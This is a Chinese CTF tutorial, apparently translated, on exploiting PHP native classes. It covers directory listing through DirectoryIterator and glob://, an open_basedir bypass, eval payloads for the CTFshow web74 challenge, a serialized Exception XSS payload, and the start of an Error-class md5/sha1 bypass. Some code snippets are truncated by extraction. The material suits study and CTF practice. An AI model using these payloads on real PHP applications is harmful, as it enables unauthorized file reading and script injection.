# 浅析PHP原生类
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言：
从2021年开始参加CTF比赛开始，就有几次遇到PHP原生类函数，自己也从来系统学习过这些类是如何使用的，但是该考点很常见，所以就来系统的学习一下。
## 分类
###  1.读取目录/文件（内容）
###  2.构造XSS
###  3.Error绕过
###  4.SSRF
###  5.获取注释内容
这里本人只列出了在CTF比赛中比较常见的PHP原生类利用方式
###  1.读取目录/文件（内容）
**1.1.查看文件类**
这里介绍两个原生类
**[Directorylterator](https://www.php.net/manual/zh/class.directoryiterator.php)**
(PHP 5, PHP 7, PHP 8)
**[Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php)**
(PHP 5 >= 5.3.0, PHP 7, PHP 8)
当然从官方文档我们不难看出两个原生类的关系
即继承关系  
查看官方文档可以发现在该类下有一个__toString()方法
而这个__toString()方法可以获取字符串形式的文件名
这边起一个docker环境本地测试一下
测试代码：
    __toString().'');
    }
    ?>
可以直接配合glob伪协议来读取目录
下面看一下效果图
这种姿势也可以无视open_basedir的限制
并且从图中就可以看出这两个原生类的些许区别了，Filesystemlterator会以绝路路径的形式展现，而DirectoryIterator仅显示出当前目录下的文件信息
这两个类同样也有一句话形式payload：
DirectoryIterator:
    $a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'');}
FilesystemIterator:
    $a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'');}
这里简单测试一下
**CTFshow web74**
    error_reporting(0);
    ini_set('display_errors', 0);
    // 你们在炫技吗？
    if(isset($_POST['c'])){
            $c= $_POST['c'];
            eval($c);
            $s = ob_get_contents();
            ob_end_clean();
            echo preg_replace("/[0-9]|[a-z]/i","?",$s);
    }else{
        highlight_file(__FILE__);
    }
    ?>
传入payload
    c=$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'');}exit();
得到
包含一下即可
    c=include('/flagx.txt');exit();
**[Globlterator](https://www.php.net/manual/zh/class.globiterator.php)**
(PHP 5 >= 5.3.0, PHP 7, PHP 8)
与前两个类的作用相似，GlobIterator 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于
glob()，可以通过模式匹配来寻找文件路径。
既然遍历一个文件系统性为类似于glob()
所以在这个类中不需要配合glob伪协议，可以直接使用
看了一下文档发现该原生类是继承FilesystemIterator的，所以也是以绝对路径显示的
测试代码
    __toString().'');
    }
    ?>
传参直接给路径就行
**1.2读取文件内容**
[SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php)  
(PHP 5 >= 5.1.2, PHP 7, PHP 8)
> SplFileInfo类为单个文件的信息提供了高级的面向对象接口  
>  SplFileInfo::__toString — Returns the path to the file as a string
> //将文件路径作为字符串返回
测试代码：
发现其实就是调用了system函数执行了dir
那这里给出一个Demo，供大家参考
    class Example{
        public $class;
        public $data;
        public function __construct()
        {
            $this->class = "FilesystemIterator";
            $this->data = "/";
        }
    //    public function __destruct()
    //    {
    //        echo new $this->class($this->data);
    //    }
    }
若是在反序列化题目，或者更多是在pop链构造的题目中见到形如  
$this->class($this->data)  
那就可以__destruct()方法传入类名和参数来构造我们的恶意paylaod
###  2.构造XSS
**[Error](https://www.php.net/manual/zh/class.error.php)
/[Exception](https://www.php.net/manual/zh/class.exception.php)**
官方文档显示两个内置类的使用条件：  
Error：用于PHP7、8，开启报错。  
Exceotion：用于PHP5、7、8，开启报错。
Error是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的
PHP7中，可以在echo时（PHP对象被当做字符串或使用）触发__toString，来构造XSS。
从官方文档中可以看出，这两个原生类的属性相同，都是对message、code、file、line的信息处理，并调用__toString()方法将异常的对象转换为字符串
测试代码：
利用Exception::__toString方法来构造xss
    //O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A36%3A%22%3Cscript%3Ealert%28%27U_F1ind_Me%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A34%3A%22D%3A%5CPHPstorm%5CPHPstormcode%5Cerror.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
###  3.绕过哈希
还是这两个类
**[Error](https://www.php.net/manual/zh/class.error.php)
/[Exception](https://www.php.net/manual/zh/class.exception.php)**
这里就用到我们上面提到的四个属性
message
错误消息内容
code
错误代码
file
抛出错误的文件名
line
抛出错误的行数
**注：这里会返回错误的行号，所以两个不同的对象在绕过hash函数时需要在同一行中。**
来看一下报错信息
    Error: Some error message in L:\PHPstorm\PHPstormcode\Error.php:3 Stack trace: #0 {main}
这里我们可以再来做个小测试  
来判断该原生类返回的信息是否相同
测试代码：
    ';
    echo $a;//输出a
    echo '';
    echo $b;//输出b
    echo '';
来看一下结果
    bool(false)
    Error: payload in D:\PHPstorm\PHPstormcode\errormd5.php:2 Stack trace: #0 {main}
    Error: payload in D:\PHPstorm\PHPstormcode\errormd5.php:2 Stack trace: #0 {main}
完全一样！！！
**例题 [2020 极客大挑战]Greatphp**
这个题目是个经典的哈希值判断绕过，也是这个题目让我认识了Error
源码：
    syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
               if(!preg_match("/\syc, $match)){
                   eval($this->syc);
               } else {
                   die("Try Hard !!");
               }
            }
        }
    }
    if (isset($_GET['great'])){
        unserialize($_GET['great']);
    } else {
        highlight_file(__FILE__);
    }
    ?>
可以看出这里反序列化后直接调用__wakeup()方法，该方法会对两个成员变量进行判断，两者不相等，md5加密后强等于，sha1加密后强等于。
这里我们就使用Error类即可绕过。